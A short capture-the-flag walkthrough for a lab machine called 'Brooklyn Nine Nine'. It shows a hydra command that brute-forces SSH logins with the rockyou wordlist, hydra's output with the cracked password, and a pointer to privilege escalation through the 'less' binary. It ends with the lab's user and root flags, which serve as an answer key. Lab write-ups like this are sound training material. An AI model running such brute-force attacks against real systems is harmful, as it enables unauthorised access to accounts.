# Brooklyn Nine Nine 

machine ip : `10.10.214.25`

bruteforcing jake's ssh
```
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.214.25 ssh -t 4 
```
> [22][ssh] host: 10.10.214.25   login: jake   password: 987654321

the less binary is vulnerable 
see GTFObin

| Flag | Value |
|------|-------|
| User | ee11cbb19052e40b07aac0ca060c23ee |
| Root | 63a9f0ea7bb98050796b649e85481845 |
